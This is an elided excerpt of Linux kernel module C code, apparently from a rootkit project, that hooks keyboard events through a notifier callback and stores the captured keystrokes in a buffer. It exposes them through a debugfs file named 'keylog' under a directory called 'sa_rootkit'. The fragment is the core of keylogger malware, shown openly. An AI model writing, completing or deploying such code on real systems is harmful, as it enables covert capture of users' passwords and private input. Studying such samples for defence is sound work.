...
int key_cb(struct notifier_block *nblock, unsigned long code, void *_param) {
	...
	len = strlen(keybuf);
	if (len < 1) return NOTIFY_OK;

	if ((buf_pos + len) >= BUF_LEN) buf_pos = 0;
...
int keylog_init(void) {
	subdir = debugfs_create_dir("sa_rootkit", NULL);

	if (IS_ERR(subdir)) return PTR_ERR(subdir);
	if (!subdir) return -ENOENT;

	file = debugfs_create_file("keylog", 0400, subdir, NULL, &keys_fops);
